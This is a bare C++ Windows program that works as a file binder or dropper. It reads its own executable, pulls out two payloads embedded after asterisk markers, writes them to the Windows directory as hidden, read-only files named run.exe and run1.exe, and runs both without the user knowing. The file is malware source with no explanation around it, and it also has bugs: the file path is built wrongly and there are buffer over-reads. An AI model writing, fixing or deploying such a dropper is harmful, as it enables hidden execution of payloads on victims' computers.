#include <cstdlib>
#include <stdio.h>
#include <iostream>
#include <cstring>
#include <string>
#include <windows.h>

using namespace std;

int main(int argc, char *argv[])
{
    char path[2][MAX_PATH];
    GetWindowsDirectory(path[0], MAX_PATH);
    GetWindowsDirectory(path[1], MAX_PATH);

    strcat(path[0], "run.exe");
    strcat(path[1], "run1.exe");

    FILE *fp = fopen(argv[0], "rb");
    if (!fp){return 0;}

    fseek(fp, 0, SEEK_END);

    unsigned long size = ftell(fp);

    char *buffer = (char*)malloc(size);

    rewind(fp);
    fread(buffer, size, 1, fp);
    fclose(fp);

    int i, j, error;

    char *pt_msg = NULL, *pt_msg2 = NULL;

    char *fname[2];

    for(i=0;i<size;i++)
    {
    if(buffer[i]=='*' && buffer[i+1]=='*' && buffer[i+2]=='*' && buffer[i+3]=='*' && buffer[i+4]=='*')
    {
                  pt_msg = buffer+i+7;
                  break;
    }
    }

    for(j=i+2;j<size;j++)
    {
    if(buffer[j]=='*' && buffer[j+1]=='*' && buffer[j+2]=='*' && buffer[j+3]=='*' && buffer[j+4]=='*')
    {
                  pt_msg2 = buffer+j+7;
                  break;
    }
    }

    if(pt_msg != NULL )
    {
        FILE * fp = fopen(path[0],"wb");
        if (!fp){return 0;}
        fwrite(pt_msg,j-(i+7),1,fp);
        fclose(fp);
        SetFileAttributes(path[0], FILE_ATTRIBUTE_HIDDEN|FILE_ATTRIBUTE_READONLY);
    }

    if(pt_msg != NULL )
    {
        FILE * fp = fopen(path[1],"wb");
        if (!fp){return 0;}
        fwrite(pt_msg2,size-(j+7),1,fp);
        fclose(fp);
        SetFileAttributes(path[1], FILE_ATTRIBUTE_HIDDEN|FILE_ATTRIBUTE_READONLY);

    }

    ShellExecute(NULL, "open", path[0], NULL, NULL, 1);
    ShellExecute(NULL, "open", path[1], NULL, NULL, 1);

    free(buffer);
    return 0;
}
